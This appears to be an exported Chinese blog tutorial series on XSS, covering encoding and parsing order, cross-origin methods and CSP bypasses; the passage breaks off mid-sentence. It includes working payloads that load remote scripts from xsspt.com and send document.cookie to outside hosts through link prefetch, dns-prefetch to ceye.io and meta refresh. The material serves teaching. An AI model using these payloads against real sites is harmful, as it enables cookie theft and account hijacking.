转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在 ECMAScript 中。因此，Unicode 转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。 标识符名称中当 Unicode 转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。如果我们深入研究 JavaScript 细则，可以看到如下内容： ​ Unicode转义序列（如\\u000A\\u000B）同样被允许用在标识符名称中，被当作名称中的一个字符。而将’'符号前置在Unicode转义序列串（如\\u000A000B000C）并不能作为标识符名称中的字符。将Unicode转义序列串放在标识符名称中是非法的。 控制字符当用 Unicode 转义序列来表示一个控制字符时，例如单引号、双引号、圆括号等等，它们将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。如果你去看 ECMAScript 的语法，就会发现没有一处会用Unicode 转义序列来当作控制字符。例如，如果解析器正在解析一个函数调用语句，圆括号部分必须为(和)，而不能是\\u0028和\\u0029。 总的来说，Unicode 转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。 ExampleExample 11&lt;a href=\"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29\"&gt;test&lt;/a&gt; 这段代码可以被执行，首先经过 HTML 解析器，把 HTML 实体部分解析了，变成 1&lt;a href=\"javascript:%61%6c%65%72%74%28%32%29\"&gt;test&lt;/a&gt; 此时，由于 javascript 已经生成，不违反 URL 解析规则。所以，URL 解析正常。解析了 javascript ，最终进入 JS解析器。注意，URL 解析器还完成了 URL 解码工作。 1&lt;a href=\"javascript:alert(2)\"&gt;test&lt;/a&gt; 所以可以成功执行代码弹窗。 Example 21&lt;a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"&gt;&lt;/a&gt; 其中 URL 编码的是javascript:alert(1)，其实这段代码放到 html 当中并不会执行，URL解码之后 Javascript 解析器完成解码操作，讲道理脚本应该会正常执行啊，这里就有一个 URL 解析过程中的一个细节了，不能对协议类型进行任何的编码操作，否则 URL 解析器会认为它无类型，就导致这里被编码的javascript没有解码，当然不会被 URL 解析器识别了。 Example 31&lt;a href=\"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#40;&amp;#51;&amp;#41;\"&gt;test3&lt;/a&gt; 以上为对&lt;a href=\"javascript:alert(3)\"&gt;test3&lt;/a&gt;先做 JS 编码，然后做URL编码，再做HTML编码共3层。 所以这里符合编码其实在首先经过 HTML 解析器解析之后变成 1&lt;a href=\"javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)\"&gt;test3&lt;/a&gt; 再经过 URL 解析器解析到了javascript，并解析后面的 url 编码变成 1&lt;a href=\"javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(3)\"&gt;test3&lt;/a&gt; URL 解析器传给 JS 解析器解析 javascript 代码，正常解析得到弹窗 Example 41&lt;a onclick=\"window.open('value1')\" href=\"javascript:window.open('value2')\"&gt;&lt;/a&gt; value1处，先经过 HTML 解码，然后经过 javascript 解码，最后经过 url 解码 value2处则是先经过 HTML 解码，然后经过 url 解码，接着 javascript 解码，最后经过 url 解码 Example 512&lt;img src&amp;#x3d;\"http://www.example.com\"&gt;&lt;img s&amp;#x72;c=\"http://www.example.com\"&gt; 这里都不会加载图片，因为参考我们上面讲的三种状态，这里实体编码存在的地方并不属于任何一种状态，所以并不会被解码。 Examples &lt;a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"&gt;&lt;/a&gt;URL encoded “javascript:alert(1)” Answer: The javascript will NOT execute. Explanation: URL 解析器解析之后不会再掉用 js 解析器解析，所以不会使用 js 伪协议 &lt;a href=\"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61 %6c%65%72%74%28%32%29\"&gt; Character entity encoded “javascript” and URL encoded “alert(2)” Answer: The javascript will execute. Explanation: 首先用 HTML 解析器解析实体字符，再用 URL 解析器解析，并调用 js 解析器进行 js 伪协议解析 &lt;a href=\"javascript%3aalert(3)\"&gt;&lt;/a&gt; URL encoded “:” Answer: The javascript will NOT execute. Explanation: URL 解析器解析之后并不会识别 js 伪协议 &lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; Character entity encoded &lt; and &gt; Answer: The javascript will NOT execute. Explanation: 参照 #数据状态中的字符引用 &lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; Character entity encoded &lt; and &gt; Answer: The javascript will NOT execute AND the character entities will NOTbe decoded either Explanation: 参照 #RCDATA 状态中的字符引用 &lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt; Answer: The javascript will NOT execute. Explanation: 参照 #RCDATA 状态中的字符引用 &lt;button onclick=\"confirm('7&amp;#39;);\"&gt;Button&lt;/button&gt; Character entity encoded ‘ Answer: The javascript will execute. Explanation: 属于属性值状态中的字符引用，会在 HTML 解析器中首先被解析成'，闭合了单引号，得到执行 &lt;button onclick=\"confirm('8\\u0027);\"&gt;Button&lt;/button&gt; Unicode escape sequence encoded ‘ Answer: The javascript will NOT execute. Explanation: 存在字符串中，不会被解析成' &lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt; Character entity encoded alert(9); Answer: The javascript will NOT execute. Explanation: 由 js 解析器解析，并不会交由 HTML 解析器解析，所以不识别，不执行 &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt; Unicode Escape sequence encoded alert Answer: The javascript will execute. Explanation: 由 js 解析器解析，属于 js 的编码，可以直接执行 &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt; Unicode Escape sequence encoded alert(11) Answer: The javascript will NOT execute. Explanation: 由 js 解析器解析，属于 js 的编码，但是编码了(、)，而这两个属于控制字符，不会被正常解析 &lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt; Unicode Escape sequence encoded alert and 12 Answer: The javascript will NOT execute. Explanation: 要么是因为\\u0031\\u0032不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是 ASCII 型数字。 &lt;script&gt;alert('13\\u0027)&lt;/script&gt; Unicode escape sequence encoded ‘ Answer: The javascript will NOT execute. Explanation: 在字符串中，被解析成字符串 &lt;script&gt;alert('14\\u000a')&lt;/script&gt; Unicode escape sequence encoded line feed. Answer: The javascript will execute. Explanation: \\u000a会被解释成换行符文本，这并不会导致真正的换行从而引发 JavaScript 语法错误。 &lt;a href=\"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;\"&gt;&lt;/a&gt; Answer: The javascript will execute. Explanation: 参照 Example 3 ReferencemXSS简述 浅谈XSS—字符编码和浏览器解析原理 XSS测试备忘录 Deep dive into browser parsing and XSS payload encoding 浏览器的渲染：过程与原理 XSS小结 Cross-site Scripting (XSS)","link":"/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-I/"},{"title":"Web安全从零开始-XSS II","text":"这是自己写的 Web 安全从零开始系列之 XSS 篇。第二篇讲解同源策略与XSS [TOC] 跨域XSS 离不开的问题就是跨域问题，也是比较常见的问题。 介绍这里简单地介绍一下什么是同源策略。 所谓跨域，或者异源，是指主机名（域名）、协议、端口号只要有其一不同，就为不同的域（或源）。浏览器中有一个基本的策略，叫同源策略，即限制“源”自A的脚本只能操作“同源”页面的DOM。 浏览器中，&lt;script&gt;/&lt;img&gt;/&lt;iframe&gt;/&lt;link&gt;等标签都是可以跨域来加载资源的，而不受同源策略的影响。带”src”属性的标签每次加载时，实际上都是浏览器发起了一次”GET”请求。 不同于XMLHttpRequest的是，通过src属性加载的资源，浏览器是限制了javascript的权限，使其不能够读写返回的内容。对于 XMLHttpRequest来说，它可以访问来自同源对象的内容。但是不能够访问跨域访问资源，所有在ajax开发中尤其需要注意这点在w3c委员会制 定了XMLHttpRequest跨域访问标准。他需要通过目标域返回的HTTP头授权是否允许跨域访问，因为HTTP头对于javascript来说一 般是无法控制的，所以认为这个方案是可行的。 对于浏览器来说：除了DOM、Cookie、XMLHttprequest会受到同源策略的限制外，浏览器加载的第三方插件也有各自的同源策略。例如：flash,java applet,silverlight,coogle gears等。 跨域方法 通过jsonp跨域 document.domain + iframe跨域 location.hash + iframe window.name + iframe跨域 postMessage 跨域 跨域资源共享（CORS） nginx代理跨域 nodejs中间件代理跨域 WebSocket协议跨域 这里简单介绍几种，其余的可以参考前端常见跨域解决方案（全） JSONP对于一段 JavaScript 脚本来说，其“源”与它存储的地址无关，而取决于脚本被加载的页面，例如我们在页面中使用&lt;script&gt;引入存储在其他域的脚本文件：&lt;script src=\"http://www.a.com/index.js\"&gt;&lt;/script&gt;Jsonp 正是利用这种特性来实现跨域的：在页面中引入要跨域访问的来源，并定义回调函数处理跨域访问得到的json 数据。如： 123456&lt;script&gt;function handleData(data) { //处理数据}&lt;/script&gt;&lt;script src=\"http://www.a.com/getData.do?callback=handleData\"&gt;&lt;/script&gt; 服务端代码： 12String handleData = request.getParameter(\"callback\");//客户端的回调函数out.println(handleData+\"(\"+resultJSON+\")\");//返回jsonp格式数据 缺陷是只能用于 GET 请求 Document.domainwww.a.com/1.html和a.com/2.html是不同域的，要使他们可以跨域访问，可通过修改document.domain来实现，即在两个页面中都设置： 1document.domain=\"a.com\"; 需要注意的是document.domain只能往父级修改，如 a.com 改为 www.a.com 是不被允许的，这也是此方法的局限性，只使用于跨子域访问。 CROS 跨域资源共享CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）跨域资源共享 CORS 详解。看名字就知道这是处理跨域问题的标准做法。 普通跨域请求：只服务端设置Access-Control-Allow-Origin即可，前端无须设置，若要带cookie请求：前后端都需要设置。 需注意的是：由于同源策略的限制，所读取的cookie为跨域请求接口所在域的cookie，而非当前页。 postMessage 跨域postMessage是HTML5 XMLHttpRequest Level 2中的API，且是为数不多可以跨域操作的window属性之一，它可用于解决以下方面的问题： 页面和其打开的新窗口的数据传递 多窗口之间消息传递 页面与嵌套的iframe消息传递 上面三个场景的跨域数据传递 postMessage(message, targetOrigin, [transfer]); message 将要发送到其他 window的数据。它将会被[结构化克隆算法](https://developer.mozilla.org/en-US/docs/DOM/The_structured_clone_algorithm)序列化。这意味着你可以不受什么限制的将数据对象安全的传送给目标窗口而无需自己序列化。 targetOrigin 通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串\"*\"（表示无限制）或者一个URI。在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。这个机制用来控制消息可以发送到哪些窗口；例如，当用postMessage传送密码时，这个参数就显得尤为重要，必须保证它的值与这条包含密码的信息的预期接受者的origin属性完全一致，来防止密码被恶意的第三方截获。**如果你明确的知道消息应该发送到哪个窗口，那么请始终提供一个有确切值的targetOrigin，而不是\\*。不提供确切的目标将导致数据泄露到任何对数据感兴趣的恶意站点。** `transfer ` 是一串和message 同时传递的 [`Transferable`](https://developer.mozilla.org/zh-CN/docs/Web/API/Transferable) 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。 举个例子： a.html：(http://www.domain1.com/a.html) 12345678910111213141516&lt;iframe id=\"iframe\" src=\"http://www.domain2.com/b.html\" style=\"display:none;\"&gt;&lt;/iframe&gt;&lt;script&gt; var iframe = document.getElementById('iframe'); iframe.onload = function() { var data = { name: 'aym' }; // 向domain2传送跨域数据 iframe.contentWindow.postMessage(JSON.stringify(data), 'http://www.domain2.com'); }; // 接受domain2返回数据 window.addEventListener('message', function(e) { alert('data from domain2 ---&gt; ' + e.data); }, false);&lt;/script&gt; b.html：(http://www.domain2.com/b.html)) 1234567891011121314&lt;script&gt; // 接收domain1的数据 window.addEventListener('message', function(e) { alert('data from domain1 ---&gt; ' + e.data); var data = JSON.parse(e.data); if (data) { data.number = 16; // 处理后再发回domain1 window.parent.postMessage(JSON.stringify(data), 'http://www.domain1.com'); } }, false);&lt;/script&gt; XSS 中的跨域这里给 xsspt.com 上的几个例子 123&lt;img src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwczovL3hzc3B0LmNvbS9YWGN4b3U/JytNYXRoLnJhbmRvbSgp'))&gt;&lt;script src=//xsspt.com/XXcxou&gt;&lt;/script&gt; 或者 1javascript:eval('window.s=document.createElement(\"script\");window.s.src=\"//xsspt.com/XXcxou\";document.body.appendChild(window.s)')","link":"/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-II/"},{"title":"Web安全从零开始 XSS III","text":"这是自己写的 Web 安全从零开始系列之 XSS 篇。第三篇讲解 CSP 与 XSS [TOC] CSP(Content Security Policy)介绍CSP 全称为 Content Security Policy，即内容安全策略。主要以白名单的形式配置可信任的内容来源，在网页中，能够使白名单中的内容正常执行（包含 JS，CSS，Image 等等），而非白名单的内容无法正常执行，从而减少跨站脚本攻击（XSS），当然，也能够减少运营商劫持的内容注入攻击。 为使CSP可用, 你需要配置你的网络服务器返回 Content-Security-Policy HTTP头部 ( 有时你会看到一些关于X-Content-Security-Policy头部的提法, 那是旧版本，你无须再如此指定它)。 除此之外, &lt;meta&gt;元素也可以被用来配置该策略, 例如 1&lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; img-src https://*; child-src 'none';\"&gt; 语法组成策略组成CSP 有两种策略类型： Content-Security-Policy Content-Security-Policy-Report-Only 这两种策略类型的主要区别也可以从命名上看出，第一种对不安全的资源会进行阻止执行，而第二种只会进行数据上报，不会有实际的阻止。当定义多个策略的时候，浏览器会优先采用最先定义的。 指令集合CSP 的指令是组成内容来源白名单的关键，上面两种策略类型含有以下众多指令，可以通过搭配得到满足网站资源来源的白名单。 指令示例及说明 指令 取值示例 说明 default-src ‘self’ cdn.example.com 定义针对所有类型（js/image/css/web font/ajax/iframe/多媒体等）资源的默认加载策略，某类型资源如果没有单独定义策略，就使用默认。 script-src ‘self’ js.example.com 定义针对JavaScript的加载策略 object-src ‘self’ 针对&lt;object&gt;/&lt;embed&gt;/&lt;applet&gt;等标签的加载策略 style-src ‘self’ css.example.com 定义针对样式的加载策略 img-src ‘self’ image.example.com 定义针对图片的加载策略 media-src ‘media.example.com’ 针对或者引入的html多媒体等标签的加载策略 frame-src ‘self’ 针对iframe的加载策略 connect-src ‘self’ 针对Ajax、WebSocket等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为400的响应 font-src font.qq.com 针对Web Font的加载策略 sandbox allow-forms allow-scripts 对请求的资源启用sandbox report-uri /some-report-uri 告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。不阻止任何内容，可以改用Content-Security-Policy-Report-Only头 base-uri ‘self’ 限制当前页面的url（CSP2） child-src ‘self’ 限制子窗口的源(iframe、弹窗等),取代frame-src（CSP2） form-action ‘self’ 限制表单能够提交到的源（CSP2） frame-ancestors ‘none’ 限制了当前页面可以被哪些页面以iframe,frame,object等方式加载（CSP2） plugin-types application/pdf 限制插件的类型（CSP2） 指令值示例及说明 指令值 示例 说明 * img-src * 允许任何内容 ‘none’ img-src ‘none’ 不允许任何内容 ‘self’ img-src ‘self’ 允许同源内容 data: img-src data: 允许data:协议（如base64编码的图片） www.a.com img-src www.a.com 允许加载指定域名的资源 *.a.com img-src *.a.com 允许加载a.com任何子域的资源 https://img.com img-src https://img.com 允许加载img.com的https资源 https: img-src https: 允许加载https资源 ‘unsafe-inline’ script-src ‘unsafe-inline’ 允许加载inline资源（style属性，onclick，inline js和inline css等等） ‘unsafe-eval’ script-src ‘unsafe-eval’ 允许加载动态js代码，例如eval() script-src有几个特性： ‘unsafe-inline’：允许执行页面内嵌的&amp;lt;script&gt;标签和事件监听函数 unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。 nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行 hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。 页面内嵌脚本，必须有这个token才能执行。 123&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt; // some code&lt;/script&gt; hash值的例子如下，服务器给出一个允许执行的代码的hash值。 1Content-Security-Policy: script-src 'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=' 下面的代码就会允许执行，因为hash值相符。 1&lt;script&gt;alert('Hello, world.');&lt;/script&gt; 这里可以用以下命令得到这段 hash 12$ echo -n \"alert('Hello, world.');\" | openssl dgst -binary -sha256 | openssl base64qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng= 使用方式HTML Meta 标签在这种形式中，Meta 标签主要含有两部分的 key-value： http-equiv content http-equiv 的 value 为 CSP 的策略类型，而 content 则是声明指令集合，即白名单。如 1&lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'\"&gt; 在HTML 的 head 中 添加上面的 Meta 标签，那么当浏览器支持 CSP 标准时，由于使用的是 Content-Security-Policy 实际阻止的策略，所以将会使得非同源的 script（根据指令集合来定）不会被加载及执行。 Meta 标签的 Content-Security-Policy-Report-Only 方式在当前（2016/5/19）多数移动端浏览器上表现正常，但是 不推荐 这样做，如 chrome 50 会产生如下的提示 The report-only Content Security Policy xxxxxxx was delivered via a element,which is disallowed. The policy has been ignored. HTTP Header通过 Meta 的方式很是简单，但当涉及到的页面较多时，使用 Meta 标签的方式需要在每个页面都各自加上。而如果通过服务端配置 HTML 返回的响应头 HTTP header 带上 CSP 的指令的话，那将能够一劳永逸，同时支持多个页面。下图为响应头 不仅如此，这种形式的 Content-Security-Policy-Report-Only 方式能够得到更好的兼容支持，也是推荐方式。 绕过方式建议参考CSP Level 3浅析&amp;简单的bypass，这里我们简述几种情况下的绕过方式 url 跳转在default-src 'none'的情况下，可以使用&lt;meta&gt;标签实现跳转 1&lt;meta http-equiv=\"refresh\" content=\"1;url=http://www.xss.com/x.php?c=[cookie]\" &gt; 在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。 &lt;link&gt;标签预加载prefetchCSP对link标签的预加载功能考虑不完善，一般是通过 link 标签来实现预加载的指令 在 Chrome 下，可以使用如下标签发送 cookie（最新版Chrome会禁止） 1&lt;link rel=\"prefetch\" href=\"http://www.xss.com/x.php?c=[cookie]\"&gt; 虽然在标签内不能拿 cookie ，但是如果可以执行内联 js 的话，情况就不一样了 1Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; 如果头像上面那样的话，我们可以用以下 payload 123456&lt;script&gt; var i=document.createElement('link'); i.setAttribute('rel','prefetch'); i.setAttribute('href','http://xxx.com?'+document.cookie); document.head.appendChild(i); &lt;/script&gt; dns-prefetch在 Firefox 下，可以将 cookie 作为子域名，用 dns 预解析的方式把 cookie 带出去，查看dns服务器的日志就能得到 cookie 1&lt;link rel=\"dns-prefetch\" href=\"//[cookie].xxx.ceye.io\"&gt; 同样想要在 1Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; 这种情况下收获 Cookie 的话 12345678910&lt;script&gt; dcl = document.cookie.split(\";\"); n0 = document.getElementsByTagName(\"HEAD\")[0]; for (var i=0; i&lt;dcl.length;i++) { console.log(dcl[i]); n0.innerHTML = n0.innerHTML + \"&lt;link rel=\\\"dns-prefetch\\\" href=\\\"//\" + escape(dcl[i].replace(/\\//g, \"-\")).replace(/%/g, \"_\") + '.' + location.hostname.replace(/\\./g, \"-\") + \".xxxx.ceye.io\\\"&gt;\"; }&lt;/script&gt; 因为域名的命名规则是 [.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换 preconnectpreconnect(预连接)，与 DNS预解析 类似，但它不仅完成 DNS 预解析，还进行 TCP 握手和 TLS 协商 利用方式和上面类似 利用浏览器补全有些网站限制只有某些脚本才能使用，往往会使用&lt;script&gt;标签的 nonce 属性，只有 nonce 一致的脚本才生效，比如 CSP 设置成下面这样： 1Content-Security-Policy: default-src 'none';script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa' 那么当脚本插入点为如下的情况时 12&lt;p&gt;插入点&lt;/p&gt;&lt;script id=\"aa\" nonce=\"abc\"&gt;document.write('CSP');&lt;/script&gt; 可以插入 1&lt;script src=//14.rs a=\" 这样会拼成一个新的script标签，其中的src可以自由设定 12&lt;p&gt;&lt;script src=//14.rs a=\"&lt;/p&gt;&lt;script id=\"aa\" nonce=\"EDNnf03nceIOfn39fn3e9h3sdfa\"&gt;document.write('CSP');&lt;/script&gt; 代码重用例如假设页面中使用了 Jquery-mobile 库，并且CSP策略中包含script-src 'unsafe-eval'或者script-src 'strict-dynamic'，那么下面的向量就可以绕过CSP： 1&lt;div data-role=popup id='&lt;script&gt;alert(1)&lt;/script&gt;'&gt;&lt;/div&gt; 在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie 1&lt;amp-pixel src=\"http://your domain/?cid=CLIENT_ID(FLAG)\"&gt;&lt;/amp-pixel&gt; iframe如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP： 1&lt;iframe src=\"B\"&gt;&lt;/iframe&gt; 在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”http://xxx“页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。 1&lt;iframe csp=\"script-src 'unsafe-inline'\" src=\"http://xxx\"&gt;&lt;/iframe&gt; metameta 标签有一些不常用的功能有时候有奇效： meta 可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。 1&lt;meta http-equiv=\"cache-control\" content=\"public\"&gt; meta可以设置Cookie（Firefox下），可以结合 self-xss 利用。 1&lt;meta http-equiv=\"Set-Cookie\" Content=\"cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/\"&gt; ExamplesExample 1、2 可以参考Neatly bypassing CSP Example 1假设服务器设置了以下 CSP 策略 1&lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self' 'unsafe-inline'\"&gt; 设置了允许同源与 inline 资源，来自外部源的所有内容会被拦截，其中包括图像、CSS、websockets，尤其是 JS 代码。 显然如果我们直接用以下代码是肯定会被 CSP 拦截的 12345&lt;script&gt; frame=document.createElement(\"iframe\"); frame.src=\"//bo0om.ru/csp.js\"; document.body.appendChild(frame);&lt;/script&gt; 但是我们需要知道一点 ​ Most of the modern browser automatically convert files, such as text files or images, to an HTML page. The reason for this behavior is to correctly depict the content in the browser window; it needs to have the right background, be centered and so on. However, iframe is also a browser window!. Thus, opening any file that needs to shown in a browser in an iframe (i.e. favicon.ico or robots.txt) will immediately convert them into HTML without any data validation as long as the content-type is right. 怎么说呢，比如我们先随便创建一个 html 文件，代码如下 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self' 'unsafe-inline'\"&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; frame=document.createElement(\"iframe\"); frame.src=\"./bootstrap.min.css\"; document.body.appendChild(frame); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 当前目录下随便放置一个文件提供引入即可，然后我们可以发现iframe当中其实就是个 html 页面 然后我们尝试对其进行修改 1window.frames[0].document.head.innerHTML = \"hasaki!\"; 我们就可以在iframe的页面中发现&lt;head&gt;标签内容已经被我们改成了hasaki! 做到这里，我们基本可以想到，如果我们引用的是一个没有 CSP 策略的地址含有恶意的 js 代码会怎么样呢？我们可以试一下 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self' 'unsafe-inline'\"&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; f=document.createElement(\"iframe\"); f.id=\"pwn\"; f.src=\"/robots.txt\"; f.onload=()=&gt;{ x=document.createElement('script'); x.src='//bo0om.ru/csp.js'; pwn.contentWindow.document.body.appendChild(x) }; document.body.appendChild(f); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Csp.js 中的代码为 1alert('Wow! Origin: '+location.origin+'\\nUrl: '+top.location.href+'?'); 可以发现执行了 javascript 代码 Example 2讲例2之前我们先来看一个 HTTP 头中的 X-Frame-Options 字段 ​ X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在&lt;frame&gt;,&lt;iframe&gt;或者&lt;object&gt;中展现的标记。网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，也从而避免了点击劫持 (clickjacking) 的攻击。 X-Frame-Options 有三个值: DENY 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。 SAMEORIGIN 表示该页面可以在相同域名页面的 frame 中展示。 ALLOW-FROM *uri* 表示该页面可以在指定来源的 frame 中展示。 换一句话说，如果设置为 DENY，不光在别人的网站frame嵌入时会无法加载，在同域名页面中同样会无法加载。另一方面，如果设置为SAMEORIGIN，那么页面就可以在同域名页面的frame中嵌套。 如果那个页面配置了X-Frame-Options: Deny的话，如果我们还用例1的方法，我们就不能通过这个页面来使用例1的方法，那如果我们只能用这个页面有什么方法呢？ 我们还是在之前的 CSP 策略下 1&lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self' 'unsafe-inline'\"&gt; 一般来说很多开发人员只在页面响应码为 200 时增加了X-Frame-Options，而一般错误页面被认为是可以不那么关注的页面，毕竟只是静态页面，不会有什么太多的问题，所以一般错误页面不会被设置X-Frame-Options字段，检测方法也很简单，打开一个 404 